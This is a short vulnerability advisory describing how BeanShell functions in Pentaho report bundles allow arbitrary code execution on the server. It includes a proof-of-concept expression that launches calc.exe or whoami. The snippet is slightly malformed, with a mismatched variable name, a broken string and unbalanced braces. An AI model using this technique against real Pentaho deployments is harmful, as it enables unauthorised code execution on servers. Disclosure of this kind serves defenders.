Vulnerability Details:

Pentaho allows users to create and run Pentaho Report Bundles (.prpt).
Users can create PRPT reports by utilizing the Pentaho Designer application
and can include BeanShell Script functions to ease the production of
complex reports. However, the BeanShell Script functions can allow
for the execution of arbitrary Java code when Pentaho PRPT Reports are run
by Pentaho Business Analytics. This functionality allows any user with
sufficient privileges to upload or edit an existing Pentaho Report Bundle
(through Pentaho Designer) and execute arbitrary code in the
context of the Pentaho application user running on the web server.

The following proof-of-concept BeanShell Expression demonstrates Remote
Code Execution on the underlying host server of the Pentaho application.

--- ~~~ --- ~~~ ---
// BeanShell Expression
getValue() {
// Detect the underlying Operating System
boolean isWindowsOS = System.getProperty("os.name
").toLowerCase().startsWith("windows");
if (isWindows) {
// Spawning Windows Calculator App
Runtime.getRuntime().exec("calc.exe");
} else {
// Executing the Linux ‘whoami’ command
Runtime.getRuntime().exec("whoami");
}
}
// Returns the string “done” When the PRPT report is executed
return ("Done!");
}
